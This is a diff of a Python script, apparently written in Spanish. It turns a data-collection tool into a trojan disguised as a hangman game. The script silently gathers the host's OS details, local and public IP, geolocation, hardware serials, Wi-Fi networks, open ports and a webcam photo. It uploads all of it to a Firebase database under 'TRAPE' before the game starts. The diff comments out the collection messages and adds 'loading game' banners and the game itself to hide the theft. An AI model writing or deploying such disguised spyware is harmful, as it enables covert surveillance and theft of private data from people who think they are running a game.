@@ -25,29 +25,29 @@ def to_gb(bytes):
 def getEspacioEnDisco():
     disk_usage = psutil.disk_usage("C:\\")
     Datos = {"Espacio_total" : str(to_gb(disk_usage.total)),"Espacio_libre": str(to_gb(disk_usage.free)),
-    "Espacio_usado":str(to_gb(disk_usage.used)),"Porcentaje de espacio usado": str(disk_usage.percent)}
+    "Espacio_usado":str(to_gb(disk_usage.used)),"Porcentaje_de_espacio_usado": str(disk_usage.percent)}
     return Datos
 
 def getEspacioEnDiscoL():
     disk_usage = psutil.disk_usage('/')
     Datos = {"Espacio_total" : str(to_gb(disk_usage.total)),"Espacio_libre": str(to_gb(disk_usage.free)),
-    "Espacio_usado":str(to_gb(disk_usage.used)),"Porcentaje de espacio usado": str(disk_usage.percent)}
+    "Espacio_usado":str(to_gb(disk_usage.used)),"Porcentaje_de_espacio_usado": str(disk_usage.percent)}
     return Datos
 
 def getPuertosOpen():
     IP = '127.0.0.1'
     Start = int(7999)
     End = int(8010)
-    print '[+] Connecting to %s from %s to %s' % (IP, Start, End)
+    # print '[+] Connecting to %s from %s to %s' % (IP, Start, End)
     connection = socket.socket()
     lista = []
     for i in range(Start, End+1):
         try:
             connection.connect( (IP, i) )
-            a= {"Puerto open": i}
+            a= {"Puerto_open": i}
+            lista.append(a)
         except:
-            a= {"Puerto close": i}
-        lista.append(a)
+            a= {"Puerto_close": i}
     connection.close()
     return lista
 
@@ -86,7 +86,9 @@ def getSerialPlaca():
 def getInterfacesRed():
     ARed = []
     Red = os.popen('netsh wlan show networks mode=bssid').read()
+    # Red = os.popen('ipconfig').read()
     ARed.append(Red)
+    print Red
     return Red
 
 def getInterfacesRedL():
@@ -113,7 +115,7 @@ def getFoto():
     leido, frame = cap.read()
     if leido == True:
         cv2.imwrite("foto.png", frame)
-        print("Foto tomada correctamente")
+        # print("Foto tomada correctamente")
         image = open('foto.png', 'rb') #open binary file in read mode
         image_read = image.read()
         image_64_encode = base64.encodestring(image_read)
@@ -127,7 +129,7 @@ def getFotoL():
     leido, frame = cap.read()
     if leido == True:
         cv2.imwrite("foto.png", frame)
-        print("Foto tomada correctamente")
+        # print("Foto tomada correctamente")
         image = open('foto.png', 'rb') #open binary file in read mode
         image_read = image.read()
         image_64_encode = base64.encodestring(image_read)
@@ -135,74 +137,206 @@ def getFotoL():
         print("Error al acceder a la camara")
     return image_64_encode
     cap.release()
-
+print ('--------------Cargando Juego----------------------')
 platform_data = platform.uname()
 if str(platform_data[0]) == "Windows":
-    print('-------Obteniendo Datos Del Sistema------')
-    DSistema = ({'Sistema Operativo': str(platform_data[0]),'Nombre De Usuario':str(platform.node()),'Arquitectura': str(platform.machine()),'Version': str(platform.version()),'Procesador:': str(platform.processor())})
+    # print('-------Obteniendo Datos Del Sistema------')
+    DSistema = ({'Sistema_Operativo': str(platform_data[0]),'Nombre_De_Usuario':str(platform.node()),'Arquitectura': str(platform.machine()),'Version': str(platform.version()),'Procesador': str(platform.processor())})
     ifr = ('-------Obteniendo Datos de Red------')
-    DRed = ({'Nombre de Usuario En Red ': str(platform.node()),'Ip Local': str(getMiIpLocal(platform.node())),'Ip Publica': str(getmiIpPublica())})
+    DRed = ({'Nombre_de_Usuario_En_Red': str(platform.node()),'Ip_Local': str(getMiIpLocal(platform.node())),'Ip_Publica': str(getmiIpPublica())})
     ifd = ('-------Obteniendo Informacion de discos------')
     DDisk = (getEspacioEnDisco())
-    print ('Scaneando Puertos....')
+    # print ('Scaneando Puertos....')
     pu= getPuertosOpen()
     DPuertos = (pu)
-    print ('------- Obteniendo Ubicacion------')
+    # print ('------- Obteniendo Ubicacion------')
     msjU = getUbicacionIP()
     DUbicacion = (msjU)
-    print ('-------Obteniendo Foto------')
+    # print ('-------Obteniendo Foto------')
     f = getFoto()
     DFoto = (f)
-    print ('-------Obteniendo N serial Disco------')
+    # print ('-------Obteniendo N serial Disco------')
     s = getSerialDisk()
     DNSDisk = (str(s))
-    print ('-------Obteniendo N serial UUID------')
+    # print ('-------Obteniendo N serial UUID------')
     U = getSerialUUID()
     DNSUUID = (str(U))
-    print ('------- Obteniendo Informacion de la placa base------')
+    # print ('------- Obteniendo Informacion de la placa base------')
     PB = getSerialPlaca()
     DInfoplaca = (PB)
-    print ('-------Obteniendo Informacion de las Interfaces de Red------')
+    # print ('-------Obteniendo Informacion de las Interfaces de Red------')
     IR = getInterfacesRed()
-    msj = ('Informacion de las Interfaces de Red')
+    msj = ('Informacion_de_las_Interfaces_de_Red')
     DInfored = msj
 else:
-    print('-------Obteniendo Datos Del Sistema------')
-    DSistema = ({'Sistema Operativo': str(platform_data[0]),'Nombre De Usuario':str(platform.node()),'Arquitectura': str(platform.machine()),'Version': str(platform.version()),'Procesador:': str(platform.processor())})
-    print (DSistema)
+    # print('-------Obteniendo Datos Del Sistema------')
+    DSistema = ({'Sistema_Operativo': str(platform_data[0]),'Nombre_De_Usuario':str(platform.node()),'Arquitectura': str(platform.machine()),'Version': str(platform.version()),'Procesador:': str(platform.processor())})
+    # print (DSistema)
     ifr = ('-------Obteniendo Datos de Red------')
-    DRed = ({'Nombre de Usuario En Red ': str(platform.node()),'Ip Local': str(getMiIpLocal(platform.node())),'Ip Publica': str(getmiIpPublica())})
-    print (DRed)
+    DRed = ({'Nombre_de_Usuario_En_Red ': str(platform.node()),'Ip_Local': str(getMiIpLocal(platform.node())),'Ip_Publica': str(getmiIpPublica())})
+    # print (DRed)
     ifd = ('-------Obteniendo Informacion de discos------')
     DDisk = (getEspacioEnDiscoL())
-    print (DDisk)
-    print ('Scaneando Puertos....')
+    # print (DDisk)
+    # print ('Scaneando Puertos....')
     pu= getPuertosOpen()
     DPuertos = (pu)
-    print ('------- Obteniendo Ubicacion------')
+    # print ('------- Obteniendo Ubicacion------')
     msjU = getUbicacionIP()
     DUbicacion = (msjU)
-    print ('-------Obteniendo Foto------')
+    # print ('-------Obteniendo Foto------')
     f = getFotoL()
     DFoto = (f)
-    print ('-------Obteniendo N serial Disco------')
+    # print ('-------Obteniendo N serial Disco------')
     s = getSerialDiskL()
     DNSDisk = (str(s))
-    print ('-------Obteniendo N serial UUID------')
+    # print ('-------Obteniendo N serial UUID------')
     U = getSerialUUID()
     DNSUUID = (str(U))
-    print ('------- Obteniendo Informacion de la placa base------')
+    # print ('------- Obteniendo Informacion de la placa base------')
     PB = getSerialPlaca()
     DInfoplaca = (PB)
-    print ('-------Obteniendo Informacion de las Interfaces de Red------')
+    # print ('-------Obteniendo Informacion de las Interfaces de Red------')
     IR = getInterfacesRedL()
     DInfored = (IR)
-    
+
 DUniversal = ({'Sistema':DSistema,'Red':DRed,'Disk':DDisk,'Puertos':DPuertos,'Ubicacion':DUbicacion,'Foto':DFoto,'DInfoplaca':DInfoplaca,'DInfored':DInfored,'DNSDisk':DNSDisk,'DNSUUID':DNSUUID,'DInfoplaca':DInfoplaca})
 
 #enviar datos a firebase
-db.child("TRAPE").push(DUniversal)
+db.child("TRAPE").set(DUniversal)
+# juego EL AHORCADO
 
+print ('--------------Juego Cargado----------------------')
+import random
+AHORCADO = ['''
+      +---+
+      |   |
+          |
+          |
+          |
+          |
+    =========''', '''
+      +---+
+      |   |
+      O   |
+          |
+          |
+          |
+    =========''', '''
+      +---+
+      |   |
+      O   |
+      |   |
+          |
+          |
+    =========''', '''
+      +---+
+      |   |
+      O   |
+     /|   |
+          |
+          |
+    =========''', '''
+      +---+
+      |   |
+      O   |
+     /|\  |
+          |
+          |
+    =========''', '''
+      +---+
+      |   |
+      O   |
+     /|\  |
+     /    |
+          |
+    =========''', '''
+      +---+
+      |   |
+      O   |
+     /|\  |
+     / \  |
+          |
+    =========''']
+palabras = 'sombra animal django oveja aprender ejercicios caballo perro vaca computadora python abeja diente conejo mantel mesa basura escritorio ubuntu gorro parque amuleto cama cuarto descargar curso diario pythondiario vaso cuadro foto revista esdrujula parlantes radio tutorial banana naranja manzana celular casco ventana silla pileta juegos televisor heladera modulos cocina timbre lavarropas estufa enchufe futbol pelota pizarron cargador factura papel impresora telefono remedio planta vegetal aves luna electricidad copa fernet google lenguaje internet esposa jarra microondas manual sarten cortina musica pato'.split()
+
+def buscarPalabraAleat(listaPalabras):
+    # Esta funcion retorna una palabra aleatoria.
+    palabraAleatoria = random.randint(0, len(listaPalabras) - 1)
+    return listaPalabras[palabraAleatoria]
+
+def displayBoard(AHORCADO, letraIncorrecta, letraCorrecta, palabraSecreta):
+    print(AHORCADO[len(letraIncorrecta)])
+    print ""
+    fin = " "
+    print 'Letras incorrectas:', fin
+    for letra in letraIncorrecta:
+        print (letra, fin)
+    print ""
+    espacio = '_' * len(palabraSecreta)
+    for i in range(len(palabraSecreta)): # Remplaza los espacios en blanco por la letra bien escrita
+        if palabraSecreta[i] in letraCorrecta:
+            espacio = espacio[:i] + palabraSecreta[i] + espacio[i+1:]
+    for letra in espacio: # Mostrará la palabra secreta con espacios entre letras
+        print (letra, fin)
+    print ""
+
+def elijeLetra(algunaLetra):
+    # Devuelve la letra que el jugador ingreso. Esta función hace que el jugador ingrese una letra y no cualquier otra cosa
+    while True:
+        print 'Adivina una letra:'
+        letra = raw_input()
+        letra = letra.lower()
+        if len(letra) != 1:
+            print 'Introduce una sola letra.'
+        elif letra in algunaLetra:
+            print 'Ya has elegido esa letra, elige otra.'
+        elif letra not in 'abcdefghijklmnopqrstuvwxyz':
+            print 'Elije una letra.'
+        else:
+            return letra
+
+def empezar():
+    # Esta funcion devuelve True si el jugador quiere volver a jugar, de lo contrario devuelve False
+    print 'Quieres jugar de nuevo? (Si o No)'
+    return raw_input().lower().startswith('s')
+
+print 'A H O R C A D O'
+letraIncorrecta = ""
+letraCorrecta = ""
+palabraSecreta = buscarPalabraAleat(palabras)
+finJuego = False
+while True:
+    displayBoard(AHORCADO, letraIncorrecta, letraCorrecta, palabraSecreta)
+    # El usuairo elije una letra.
+    letra = elijeLetra(letraIncorrecta + letraCorrecta)
+    if letra in palabraSecreta:
+        letraCorrecta = letraCorrecta + letra
+        # Se fija si el jugador gano
+        letrasEncontradas = True
+        for i in range(len(palabraSecreta)):
+            if palabraSecreta[i] not in letraCorrecta:
+                letrasEncontradas = False
+                break
+        if letrasEncontradas:
+            print ('Si! La palabra secreta es "' + palabraSecreta + '"! Has ganado!')
+            finJuego = True
+    else:
+        letraIncorrecta = letraIncorrecta + letra
+        # Comprueba la cantidad de letras que ha ingresado el jugador y si perdió
+        if len(letraIncorrecta) == len(AHORCADO) - 1:
+            displayBoard(AHORCADO, letraIncorrecta, letraCorrecta, palabraSecreta)
+            print ('Se ha quedado sin letras!\nDespues de ' + str(len(letraIncorrecta)) + ' letras erroneas y ' + str(len(letraCorrecta)) + ' letras correctas, la palabra era "' + palabraSecreta + '"')
+            finJuego = True
+    # Pregunta al jugador si quiere jugar de nuevo
+    if finJuego:
+        if empezar():
+            letraIncorrecta = ""
+            letraCorrecta = ""
+            finJuego = False
+            palabraSecreta = buscarPalabraAleat(palabras)
+        else:
+            break
 
 # starCountRef = firebase.database().ref('posts/' + postId + '/starCount');
 # starCountRef.on('value', function(snapshot) {
